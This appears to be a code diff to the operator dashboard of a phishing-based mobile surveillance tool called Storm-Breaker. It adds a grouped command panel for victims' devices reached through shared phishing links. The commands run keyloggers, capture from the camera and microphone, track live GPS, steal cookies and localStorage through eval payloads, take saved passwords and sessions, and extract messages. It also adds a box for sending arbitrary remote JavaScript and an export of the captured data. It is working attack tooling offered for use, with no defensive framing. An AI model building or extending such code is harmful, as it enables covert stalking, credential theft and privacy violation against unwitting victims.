@@ -1,18 +1,136 @@
 /**
  * Storm-Breaker Ultimate Mobile Control Dashboard
- * Complete mobile surveillance interface
+ * Enhanced with device fingerprinting, live battery, grouped commands, and real-time output
  */
 
 let selectedMobileClient = null;
 let mobileClients = [];
 let mobileRefreshInterval = null;
 let responseRetryCount = 0;
-const MAX_RETRIES = 10;
+const MAX_RETRIES = 15;
+let mobileOutputHistory = [];
+let mobileCommandHistory = [];
+let mobileCmdHistoryIdx = -1;
+let autoScrollMobile = true;
+
+// Command categories for organized UI
+const MOBILE_COMMANDS = {
+    '📸 Camera & Media': {
+        'screenshot': { label: 'Screenshot', icon: 'fa-camera', cmd: 'start_screenshot', desc: 'Capture screen' },
+        'photo_front': { label: 'Front Camera', icon: 'fa-user', cmd: 'capture_front_camera', desc: 'Front photo' },
+        'photo_back': { label: 'Back Camera', icon: 'fa-camera-retro', cmd: 'capture_back_camera', desc: 'Back photo' },
+        'record_audio': { label: 'Record Audio', icon: 'fa-microphone', cmd: 'record_audio', desc: '30s mic' },
+        'screen_record': { label: 'Screen Record', icon: 'fa-video', cmd: 'start_screen_record', desc: 'Record screen' },
+        'stop_record': { label: 'Stop Record', icon: 'fa-stop', cmd: 'stop_screen_record', desc: 'Stop recording' },
+    },
+    '🔑 Keylogger & Input': {
+        'start_kl': { label: 'Start Keylogger', icon: 'fa-keyboard', cmd: 'start_keylogger', desc: 'Log keys' },
+        'stop_kl': { label: 'Stop Keylogger', icon: 'fa-stop-circle', cmd: 'stop_keylogger', desc: 'Stop logging' },
+        'get_kl': { label: 'Get Keylogs', icon: 'fa-file-alt', cmd: 'get_keylogs', desc: 'Retrieve logs' },
+        'form_data': { label: 'Form Data', icon: 'fa-wpforms', cmd: 'get_form_data', desc: 'Input fields' },
+        'click_data': { label: 'Click Data', icon: 'fa-mouse-pointer', cmd: 'get_click_data', desc: 'Click tracking' },
+        'clipboard': { label: 'Clipboard', icon: 'fa-clipboard', cmd: 'monitor_clipboard', desc: 'Clipboard data' },
+    },
+    '📍 Location & Network': {
+        'live_loc': { label: 'Live Location', icon: 'fa-map-marker-alt', cmd: 'watch_location', desc: 'GPS tracking' },
+        'stop_loc': { label: 'Stop Location', icon: 'fa-map-marker', cmd: 'stop_watch_location', desc: 'Stop GPS' },
+        'wifi_pw': { label: 'WiFi Passwords', icon: 'fa-wifi', cmd: 'get_wifi_passwords', desc: 'Saved WiFi' },
+        'netinfo': { label: 'Network Info', icon: 'fa-network-wired', cmd: 'get_network_info', desc: 'IP & DNS' },
+    },
+    '📱 Social Media': {
+        'whatsapp': { label: 'WhatsApp', icon: 'fa-comment-dots', cmd: 'get_whatsapp', desc: 'Extract WA' },
+        'facebook': { label: 'Facebook', icon: 'fa-thumbs-up', cmd: 'get_facebook', desc: 'Extract FB' },
+        'instagram': { label: 'Instagram', icon: 'fa-heart', cmd: 'get_instagram', desc: 'Extract IG' },
+        'twitter': { label: 'Twitter/X', icon: 'fa-feather-alt', cmd: 'get_twitter', desc: 'Extract X' },
+        'telegram': { label: 'Telegram', icon: 'fa-paper-plane', cmd: 'get_telegram', desc: 'Extract TG' },
+    },
+    '💾 Data Extraction': {
+        'contacts': { label: 'Contacts', icon: 'fa-address-book', cmd: 'get_contacts', desc: 'Phone book' },
+        'sms': { label: 'SMS Messages', icon: 'fa-sms', cmd: 'get_sms', desc: 'Text messages' },
+        'call_logs': { label: 'Call Logs', icon: 'fa-phone', cmd: 'get_call_logs', desc: 'Call history' },
+        'photos': { label: 'All Photos', icon: 'fa-images', cmd: 'get_photos', desc: 'Gallery' },
+        'files': { label: 'Files', icon: 'fa-folder', cmd: 'get_files', desc: 'File system' },
+        'apps': { label: 'Installed Apps', icon: 'fa-th', cmd: 'get_installed_apps', desc: 'App list' },
+    },
+    '🔓 Credentials': {
+        'saved_pw': { label: 'Saved Passwords', icon: 'fa-key', cmd: 'get_saved_passwords', desc: 'Browser passwords' },
+        'cookies': { label: 'Cookies', icon: 'fa-cookie-bite', cmd: 'eval:document.cookie', desc: 'Session cookies' },
+        'storage': { label: 'Local Storage', icon: 'fa-database', cmd: 'eval:JSON.stringify({...localStorage})', desc: 'LocalStorage' },
+        'sessions': { label: 'Steal Sessions', icon: 'fa-user-secret', cmd: 'steal_session', desc: 'Active sessions' },
+        'history': { label: 'Browser History', icon: 'fa-history', cmd: 'get_browser_history', desc: 'Browsing history' },
+        'bookmarks': { label: 'Bookmarks', icon: 'fa-bookmark', cmd: 'get_bookmarks', desc: 'Saved bookmarks' },
+    },
+    '⚡ Advanced': {
+        'all_data': { label: 'Extract ALL', icon: 'fa-download', cmd: 'get_all_data', desc: 'Everything at once' },
+        'notifications': { label: 'Notifications', icon: 'fa-bell', cmd: 'monitor_notifications', desc: 'Push notifications' },
+        'downloads': { label: 'Downloads', icon: 'fa-cloud-download-alt', cmd: 'get_downloads', desc: 'Downloaded files' },
+    },
+};
 
 function initMobileControl() {
     refreshMobileClients();
-    mobileRefreshInterval = setInterval(refreshMobileClients, 5000);
+    mobileRefreshInterval = setInterval(refreshMobileClients, 4000);
     document.getElementById('btn-refresh-mobile')?.addEventListener('click', refreshMobileClients);
+
+    // Build command panel
+    buildCommandPanel();
+
+    // Custom command input
+    var customInput = document.getElementById('mobile-custom-cmd');
+    if (customInput) {
+        customInput.addEventListener('keydown', function (e) {
+            // History navigation
+            if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (mobileCommandHistory.length > 0 && mobileCmdHistoryIdx < mobileCommandHistory.length - 1) {
+                    mobileCmdHistoryIdx++;
+                    this.value = mobileCommandHistory[mobileCommandHistory.length - 1 - mobileCmdHistoryIdx];
+                }
+                return;
+            }
+            if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (mobileCmdHistoryIdx > 0) {
+                    mobileCmdHistoryIdx--;
+                    this.value = mobileCommandHistory[mobileCommandHistory.length - 1 - mobileCmdHistoryIdx];
+                } else {
+                    mobileCmdHistoryIdx = -1;
+                    this.value = '';
+                }
+                return;
+            }
+
+            if (e.key === 'Enter') {
+                sendCustomMobileCommand();
+            }
+        });
+    }
+}
+
+function buildCommandPanel() {
+    var panel = document.getElementById('mobile-command-panel');
+    if (!panel) return;
+
+    var html = '';
+    Object.keys(MOBILE_COMMANDS).forEach(function (category) {
+        html += `<div class="mb-3">
+            <div class="text-[10px] text-slate-500 uppercase tracking-wider mb-2 font-bold">${category}</div>
+            <div class="grid grid-cols-3 gap-1.5">`;
+
+        Object.keys(MOBILE_COMMANDS[category]).forEach(function (key) {
+            var cmd = MOBILE_COMMANDS[category][key];
+            html += `<button onclick="sendMobileCommand('${cmd.cmd}')" 
+                class="px-2 py-2 bg-slate-800 hover:bg-slate-700 border border-slate-700 hover:border-slate-600 rounded-lg text-[10px] text-slate-300 hover:text-white transition-all group text-left"
+                title="${cmd.desc}">
+                <i class="fas ${cmd.icon} text-blue-400 group-hover:text-blue-300 mr-1"></i>
+                <span>${cmd.label}</span>
+            </button>`;
+        });
+
+        html += `</div></div>`;
+    });
+
+    panel.innerHTML = html;
 }
 
 async function refreshMobileClients() {
@@ -24,28 +142,62 @@ async function refreshMobileClients() {
         const listEl = document.getElementById('mobile-client-list');
         if (!listEl) return;
 
+        // Update count badge
+        var badge = document.getElementById('mobile-count-badge');
+        if (badge) badge.textContent = mobileClients.length;
+
         if (mobileClients.length === 0) {
-            listEl.innerHTML = '<div class="text-center text-slate-600 py-4 italic">No mobile devices</div>';
+            listEl.innerHTML = `<div class="text-center py-8">
+                <i class="fas fa-mobile-alt text-3xl text-slate-700 mb-3"></i>
+                <div class="text-slate-600 text-sm">No mobile devices</div>
+                <div class="text-slate-700 text-[10px] mt-1">Share a phishing link to capture devices</div>
+            </div>`;
             return;
         }
 
-        listEl.innerHTML = mobileClients.map(client => `
-            <div class="mobile-client-item ${selectedMobileClient === client.uid ? 'bg-blue-600/20 border-blue-500' : 'bg-slate-800 border-slate-700'} 
-                 border rounded-lg p-3 cursor-pointer hover:bg-slate-700 transition-colors"
+        listEl.innerHTML = mobileClients.map(client => {
+            var isSelected = selectedMobileClient === client.uid;
+            var batteryLevel = client.info.battery?.level || 'N/A';
+            var batteryCharging = client.info.battery?.charging ? '⚡' : '';
+            var batteryColor = 'text-slate-400';
+            if (typeof batteryLevel === 'number') {
+                if (batteryLevel > 60) batteryColor = 'text-emerald-400';
+                else if (batteryLevel > 20) batteryColor = 'text-yellow-400';
+                else batteryColor = 'text-red-400';
+            }
+
+            var platform = client.info.platform || 'Unknown';
+            var platformIcon = 'fa-mobile-alt';
+            if (platform.toLowerCase().includes('android')) platformIcon = 'fa-android';
+            else if (platform.toLowerCase().includes('ios') || platform.toLowerCase().includes('iphone')) platformIcon = 'fa-apple';
+
+            var ageStr = client.seconds_ago < 60 ? client.seconds_ago + 's ago' :
+                         client.seconds_ago < 3600 ? Math.floor(client.seconds_ago / 60) + 'm ago' :
+                         Math.floor(client.seconds_ago / 3600) + 'h ago';
+
+            return `
+            <div class="mobile-client-item ${isSelected ? 'bg-blue-600/20 border-blue-500 ring-1 ring-blue-500/30' : 'bg-slate-800 border-slate-700'} 
+                 border rounded-lg p-3 cursor-pointer hover:bg-slate-700 transition-all mb-2"
                  onclick="selectMobileClient('${client.uid}')">
                 <div class="flex items-center justify-between mb-2">
-                    <span class="text-xs font-bold text-slate-300">${client.uid.substring(0, 20)}...</span>
-                    <span class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400">
-                        <i class="fas fa-circle text-[6px]"></i> ${client.seconds_ago}s
+                    <div class="flex items-center space-x-2">
+                        <i class="fab ${platformIcon} text-slate-400"></i>
+                        <span class="text-xs font-bold text-slate-300 truncate">${client.uid.substring(0, 16)}...</span>
+                    </div>
+                    <span class="text-[10px] px-2 py-0.5 rounded-full ${client.seconds_ago < 30 ? 'bg-emerald-500/20 text-emerald-400 animate-pulse' : 'bg-yellow-500/20 text-yellow-400'}">
+                        ${ageStr}
                     </span>
                 </div>
-                <div class="text-xs text-slate-500 space-y-1">
-                    <div><i class="fas fa-mobile-alt w-4"></i> ${client.info.platform || 'Unknown'}</div>
-                    <div><i class="fas fa-network-wired w-4"></i> ${client.ip}</div>
-                    ${client.info.battery ? `<div><i class="fas fa-battery-full w-4"></i> ${client.info.battery.level || 'N/A'}</div>` : ''}
+                <div class="grid grid-cols-2 gap-1 text-[10px] text-slate-500">
+                    <div><i class="fas fa-mobile-alt w-3"></i> ${platform}</div>
+                    <div><i class="fas fa-network-wired w-3"></i> ${client.ip}</div>
+                    <div class="${batteryColor}"><i class="fas fa-battery-half w-3"></i> ${batteryLevel}${typeof batteryLevel === 'number' ? '%' : ''} ${batteryCharging}</div>
+                    <div><i class="fas fa-desktop w-3"></i> ${client.info.screenWidth || '?'}×${client.info.screenHeight || '?'}</div>
+                    ${client.info.connection ? `<div><i class="fas fa-wifi w-3"></i> ${client.info.connection.type || '?'}</div>` : ''}
+                    ${client.info.cores ? `<div><i class="fas fa-microchip w-3"></i> ${client.info.cores} cores</div>` : ''}
                 </div>
-            </div>
-        `).join('');
+            </div>`;
+        }).join('');
     } catch (e) {
         console.error('Failed to refresh mobile clients:', e);
     }
@@ -61,31 +213,55 @@ function selectMobileClient(uid) {
 
         if (infoEl && infoContent) {
             infoEl.classList.remove('hidden');
+
+            var batteryHtml = '';
+            if (client.info.battery) {
+                var level = client.info.battery.level || 0;
+                var charging = client.info.battery.charging ? ' ⚡ Charging' : '';
+                var barColor = level > 60 ? 'bg-emerald-500' : level > 20 ? 'bg-yellow-500' : 'bg-red-500';
+                batteryHtml = `
+                    <div class="col-span-2 mt-1">
+                        <div class="flex justify-between text-[10px] mb-1">
+                            <span class="text-slate-500"><i class="fas fa-battery-full"></i> Battery</span>
+                            <span class="text-white">${level}%${charging}</span>
+                        </div>
+                        <div class="w-full bg-slate-800 rounded-full h-1.5">
+                            <div class="${barColor} rounded-full h-1.5 transition-all" style="width: ${level}%"></div>
+                        </div>
+                    </div>`;
+            }
+
             infoContent.innerHTML = `
-                <div class="text-slate-400"><i class="fas fa-user"></i> Platform:</div>
+                <div class="text-slate-400"><i class="fas fa-fingerprint"></i> UID:</div>
+                <div class="text-white font-mono text-[10px] truncate">${client.uid}</div>
+                <div class="text-slate-400"><i class="fas fa-mobile-alt"></i> Platform:</div>
                 <div class="text-white">${client.info.platform || 'Unknown'}</div>
                 <div class="text-slate-400"><i class="fas fa-desktop"></i> Screen:</div>
-                <div class="text-white">${client.info.screenWidth}x${client.info.screenHeight}</div>
+                <div class="text-white">${client.info.screenWidth || '?'}×${client.info.screenHeight || '?'} (${client.info.pixelRatio || 1}x)</div>
                 <div class="text-slate-400"><i class="fas fa-globe"></i> Language:</div>
                 <div class="text-white">${client.info.language || 'Unknown'}</div>
                 <div class="text-slate-400"><i class="fas fa-clock"></i> Timezone:</div>
                 <div class="text-white">${client.info.timezone || 'Unknown'}</div>
-                <div class="text-slate-400"><i class="fas fa-microchip"></i> CPU Cores:</div>
-                <div class="text-white">${client.info.cores || 'Unknown'}</div>
+                <div class="text-slate-400"><i class="fas fa-microchip"></i> CPU:</div>
+                <div class="text-white">${client.info.cores || '?'} cores</div>
                 <div class="text-slate-400"><i class="fas fa-memory"></i> RAM:</div>
-                <div class="text-white">${client.info.memory || 'Unknown'} GB</div>
-                ${client.info.battery ? `
-                    <div class="text-slate-400"><i class="fas fa-battery-full"></i> Battery:</div>
-                    <div class="text-white">${client.info.battery.level || 'N/A'} ${client.info.battery.charging ? '⚡' : ''}</div>
-                ` : ''}
+                <div class="text-white">${client.info.memory || '?'} GB</div>
+                <div class="text-slate-400"><i class="fas fa-network-wired"></i> IP:</div>
+                <div class="text-blue-400">${client.ip}</div>
                 ${client.info.connection ? `
                     <div class="text-slate-400"><i class="fas fa-wifi"></i> Connection:</div>
-                    <div class="text-white">${client.info.connection.type || 'Unknown'}</div>
+                    <div class="text-white">${client.info.connection.type || '?'} ${client.info.connection.downlink ? '(' + client.info.connection.downlink + ' Mbps)' : ''}</div>
                 ` : ''}
+                <div class="text-slate-400"><i class="fas fa-user-agent"></i> User Agent:</div>
+                <div class="text-slate-500 text-[9px] col-span-2 truncate">${client.info.userAgent || 'Unknown'}</div>
+                ${batteryHtml}
             `;
         }
 
-        addMobileOutput(`✓ Selected device: ${uid}`);
+        addMobileOutput(`✅ Connected to device: ${uid.substring(0, 20)}...`, 'success');
+        addMobileOutput(`📱 ${client.info.platform || 'Unknown'} | 📍 ${client.ip} | 🔋 ${client.info.battery?.level || '?'}%`, 'info');
+
+        if (typeof playNotificationSound === 'function') playNotificationSound();
     }
 
     refreshMobileClients();
@@ -93,11 +269,18 @@ function selectMobileClient(uid) {
 
 async function sendMobileCommand(command) {
     if (!selectedMobileClient) {
-        addMobileOutput('❌ Please select a mobile device first!');
+        addMobileOutput('❌ Please select a mobile device first!', 'error');
+        if (typeof GrowlNotification !== 'undefined') {
+            GrowlNotification.notify({ title: 'No Device', description: 'Select a mobile device first', type: 'error', position: 'top-right' });
+        }
         return;
     }
 
-    addMobileOutput(`📤 Sending command: ${command}`);
+    // Save to history
+    mobileCommandHistory.push(command);
+    mobileCmdHistoryIdx = -1;
+
+    addMobileOutput(`📤 ${command}`, 'cmd');
 
     try {
         const response = await fetch('/api/mobile/send_command', {
@@ -110,14 +293,14 @@ async function sendMobileCommand(command) {
         });
 
         if (response.ok) {
-            addMobileOutput('✓ Command queued, waiting for response...');
+            addMobileOutput('⏳ Awaiting response...', 'pending');
             responseRetryCount = 0;
             setTimeout(() => getMobileResponse(), 2000);
         } else {
-            addMobileOutput('❌ Failed to send command');
+            addMobileOutput('❌ Server rejected command (HTTP ' + response.status + ')', 'error');
         }
     } catch (e) {
-        addMobileOutput('❌ Error: ' + e.message);
+        addMobileOutput('❌ Network error: ' + e.message, 'error');
     }
 }
 
@@ -129,19 +312,33 @@ async function getMobileResponse() {
         const data = await response.json();
 
         if (data.output) {
-            addMobileOutput('📥 Response:\n' + data.output);
+            // Try to parse and pretty-print JSON
+            var output = data.output;
+            try {
+                var parsed = JSON.parse(output);
+                output = JSON.stringify(parsed, null, 2);
+            } catch (e) { /* not JSON, show as-is */ }
+
+            addMobileOutput('📥 ' + output, 'response');
             responseRetryCount = 0;
+
+            // Save to history
+            mobileOutputHistory.push({
+                command: mobileCommandHistory[mobileCommandHistory.length - 1] || 'unknown',
+                output: output,
+                timestamp: Date.now()
+            });
         } else {
             responseRetryCount++;
             if (responseRetryCount < MAX_RETRIES) {
                 setTimeout(() => getMobileResponse(), 2000);
             } else {
-                addMobileOutput('❌ Timeout: No response after ' + (MAX_RETRIES * 2) + ' seconds');
+                addMobileOutput('⏰ Timeout after ' + (MAX_RETRIES * 2) + 's — device may be offline', 'warning');
                 responseRetryCount = 0;
             }
         }
     } catch (e) {
-        addMobileOutput('❌ Error getting response: ' + e.message);
+        addMobileOutput('❌ Error: ' + e.message, 'error');
         responseRetryCount = 0;
     }
 }
@@ -152,72 +349,126 @@ function sendCustomMobileCommand() {
 
     const code = input.value.trim();
     if (!code) {
-        addMobileOutput('❌ Please enter JavaScript code');
+        addMobileOutput('❌ Empty command', 'error');
         return;
     }
 
-    sendMobileCommand('eval:' + code);
+    // Auto-prefix eval: for raw JS
+    var cmd = code;
+    if (!code.startsWith('eval:') && !code.startsWith('get_') && !code.startsWith('start_') && !code.startsWith('stop_') && !code.startsWith('steal_') && !code.startsWith('monitor_') && !code.startsWith('record_') && !code.startsWith('capture_') && !code.startsWith('watch_')) {
+        cmd = 'eval:' + code;
+    }
+
+    sendMobileCommand(cmd);
     input.value = '';
 }
 
-function addMobileOutput(text) {
+function addMobileOutput(text, type) {
     const outputEl = document.getElementById('mobile-output');
     if (!outputEl) return;
 
     const timestamp = new Date().toLocaleTimeString();
     const line = document.createElement('div');
-    line.className = 'text-slate-300';
-    line.textContent = `[${timestamp}] ${text}`;
+
+    var colorClass = 'text-slate-300';
+    switch (type) {
+        case 'success': colorClass = 'text-emerald-400'; break;
+        case 'error': colorClass = 'text-red-400'; break;
+        case 'warning': colorClass = 'text-yellow-400'; break;
+        case 'info': colorClass = 'text-blue-400'; break;
+        case 'cmd': colorClass = 'text-purple-400 font-bold'; break;
+        case 'response': colorClass = 'text-slate-200 bg-slate-800/50 rounded px-2 py-1 border-l-2 border-blue-500'; break;
+        case 'pending': colorClass = 'text-slate-500 italic'; break;
+    }
+
+    line.className = `${colorClass} text-xs mb-1 font-mono`;
+
+    // Wrap long outputs
+    if (text.length > 200) {
+        line.innerHTML = `<span class="text-slate-600">[${timestamp}]</span> <pre class="whitespace-pre-wrap mt-1 ${colorClass}">${escapeHtml(text)}</pre>`;
+    } else {
+        line.innerHTML = `<span class="text-slate-600">[${timestamp}]</span> ${escapeHtml(text)}`;
+    }
 
     outputEl.appendChild(line);
-    outputEl.scrollTop = outputEl.scrollHeight;
+    if (autoScrollMobile) {
+        outputEl.scrollTop = outputEl.scrollHeight;
+    }
 }
 
-// Basic Commands
-function extractPhotos() { sendMobileCommand('eval:document.cookie'); }
-function extractGmail() { sendMobileCommand("eval:window.open('https://mail.google.com', '_blank'); 'Gmail opened'"); }
-function extractChrome() { sendMobileCommand('eval:JSON.stringify({cookies: document.cookie, localStorage: {...localStorage}, sessionStorage: {...sessionStorage}})'); }
-function extractWhatsApp() { sendMobileCommand('get_whatsapp'); }
-function extractFacebook() { sendMobileCommand('get_facebook'); }
-function extractInstagram() { sendMobileCommand('get_instagram'); }
+function escapeHtml(text) {
+    var div = document.createElement('div');
+    div.appendChild(document.createTextNode(text));
+    return div.innerHTML;
+}
 
-// Advanced Surveillance
-function startKeylogger() { sendMobileCommand('start_keylogger'); }
-function stopKeylogger() { sendMobileCommand('stop_keylogger'); }
-function getKeylogs() { sendMobileCommand('get_keylogs'); }
-function startScreenshot() { sendMobileCommand('start_screenshot'); }
-function stopScreenshot() { sendMobileCommand('stop_screenshot'); }
-function recordAudio() { sendMobileCommand('record_audio'); }
-function watchLocation() { sendMobileCommand('watch_location'); }
-function stopWatchLocation() { sendMobileCommand('stop_watch_location'); }
-function getFormData() { sendMobileCommand('get_form_data'); }
-function getClickData() { sendMobileCommand('get_click_data'); }
-function stealSession() { sendMobileCommand('steal_session'); }
-function getAllData() { sendMobileCommand('get_all_data'); }
+function clearMobileOutput() {
+    var outputEl = document.getElementById('mobile-output');
+    if (outputEl) outputEl.innerHTML = '';
+}
 
-// Data Extraction
-function getContacts() { sendMobileCommand('get_contacts'); }
-function getSMS() { sendMobileCommand('get_sms'); }
-function getCallLogs() { sendMobileCommand('get_call_logs'); }
-function getPhotos() { sendMobileCommand('get_photos'); }
-function getVideos() { sendMobileCommand('get_videos'); }
-function getFiles() { sendMobileCommand('get_files'); }
-function getInstalledApps() { sendMobileCommand('get_installed_apps'); }
+function exportMobileOutput() {
+    if (mobileOutputHistory.length === 0) {
+        addMobileOutput('No data to export', 'warning');
+        return;
+    }
 
-// Social Media
-function getTwitter() { sendMobileCommand('get_twitter'); }
-function getTelegram() { sendMobileCommand('get_telegram'); }
+    var text = JSON.stringify(mobileOutputHistory, null, 2);
+    var blob = new Blob([text], { type: 'application/json' });
+    var link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = 'mobile_session_' + (selectedMobileClient || 'all').substring(0, 8) + '_' + new Date().toISOString().slice(0, 10) + '.json';
+    link.click();
 
-// Advanced Extraction
-function getWiFiPasswords() { sendMobileCommand('get_wifi_passwords'); }
-function getSavedPasswords() { sendMobileCommand('get_saved_passwords'); }
-function getBrowserHistory() { sendMobileCommand('get_browser_history'); }
-function getBookmarks() { sendMobileCommand('get_bookmarks'); }
-function getDownloads() { sendMobileCommand('get_downloads'); }
-function monitorClipboard() { sendMobileCommand('monitor_clipboard'); }
-function monitorNotifications() { sendMobileCommand('monitor_notifications'); }
-function startScreenRecord() { sendMobileCommand('start_screen_record'); }
-function stopScreenRecord() { sendMobileCommand('stop_screen_record'); }
+    if (typeof GrowlNotification !== 'undefined') {
+        GrowlNotification.notify({ title: 'Exported', description: 'Mobile session data saved', type: 'success', position: 'top-right' });
+    }
+}
+
+// Expose functions globally
+window.selectMobileClient = selectMobileClient;
+window.sendMobileCommand = sendMobileCommand;
+window.sendCustomMobileCommand = sendCustomMobileCommand;
+window.clearMobileOutput = clearMobileOutput;
+window.exportMobileOutput = exportMobileOutput;
+
+// Legacy function aliases
+window.extractPhotos = function() { sendMobileCommand('eval:document.cookie'); };
+window.extractGmail = function() { sendMobileCommand("eval:window.open('https://mail.google.com', '_blank'); 'Gmail opened'"); };
+window.extractChrome = function() { sendMobileCommand('eval:JSON.stringify({cookies: document.cookie, localStorage: {...localStorage}, sessionStorage: {...sessionStorage}})'); };
+window.extractWhatsApp = function() { sendMobileCommand('get_whatsapp'); };
+window.extractFacebook = function() { sendMobileCommand('get_facebook'); };
+window.extractInstagram = function() { sendMobileCommand('get_instagram'); };
+window.startKeylogger = function() { sendMobileCommand('start_keylogger'); };
+window.stopKeylogger = function() { sendMobileCommand('stop_keylogger'); };
+window.getKeylogs = function() { sendMobileCommand('get_keylogs'); };
+window.startScreenshot = function() { sendMobileCommand('start_screenshot'); };
+window.stopScreenshot = function() { sendMobileCommand('stop_screenshot'); };
+window.recordAudio = function() { sendMobileCommand('record_audio'); };
+window.watchLocation = function() { sendMobileCommand('watch_location'); };
+window.stopWatchLocation = function() { sendMobileCommand('stop_watch_location'); };
+window.getFormData = function() { sendMobileCommand('get_form_data'); };
+window.getClickData = function() { sendMobileCommand('get_click_data'); };
+window.stealSession = function() { sendMobileCommand('steal_session'); };
+window.getAllData = function() { sendMobileCommand('get_all_data'); };
+window.getContacts = function() { sendMobileCommand('get_contacts'); };
+window.getSMS = function() { sendMobileCommand('get_sms'); };
+window.getCallLogs = function() { sendMobileCommand('get_call_logs'); };
+window.getPhotos = function() { sendMobileCommand('get_photos'); };
+window.getVideos = function() { sendMobileCommand('get_videos'); };
+window.getFiles = function() { sendMobileCommand('get_files'); };
+window.getInstalledApps = function() { sendMobileCommand('get_installed_apps'); };
+window.getTwitter = function() { sendMobileCommand('get_twitter'); };
+window.getTelegram = function() { sendMobileCommand('get_telegram'); };
+window.getWiFiPasswords = function() { sendMobileCommand('get_wifi_passwords'); };
+window.getSavedPasswords = function() { sendMobileCommand('get_saved_passwords'); };
+window.getBrowserHistory = function() { sendMobileCommand('get_browser_history'); };
+window.getBookmarks = function() { sendMobileCommand('get_bookmarks'); };
+window.getDownloads = function() { sendMobileCommand('get_downloads'); };
+window.monitorClipboard = function() { sendMobileCommand('monitor_clipboard'); };
+window.monitorNotifications = function() { sendMobileCommand('monitor_notifications'); };
+window.startScreenRecord = function() { sendMobileCommand('start_screen_record'); };
+window.stopScreenRecord = function() { sendMobileCommand('stop_screen_record'); };
 
 // Initialize
 document.addEventListener('DOMContentLoaded', () => {
